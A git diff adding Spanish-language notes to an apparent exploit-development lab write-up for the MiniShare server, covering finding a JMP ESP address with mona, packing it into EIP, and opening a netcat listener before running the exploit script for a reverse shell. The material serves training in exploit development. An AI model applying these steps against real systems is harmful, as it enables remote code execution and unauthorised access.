@@ -156,5 +156,24 @@ se trata del binario `minishare.exe`, luego en ese mismo debemos buscar la sig i
 
 si no la encuentra puedes probar con 
 
-```pyht
+```python
+!mona find -s "JMP ESP"
 ```
+
+te dara instrucciones, hay que agarrar una que no tenga los badchars como `0x752c3cda`
+
+### Fase explotacion
+
+finalmente ajustar la variable `esp` del script cno el little endian
+
+```python
+eip= pack("<L", 0x752c3cda)
+```
+
+ahi el eip aplica la direccion dondes esta la instruccion JMP ESP,  por lo que quedaria del lado de atacante ponerse en escucha antes de eejcutar el script con [[rlwrap]]
+
+```sh
+rlwarp nc -nlvp 443
+```
+
+y luego el script `python lab2_MiniShare.py`
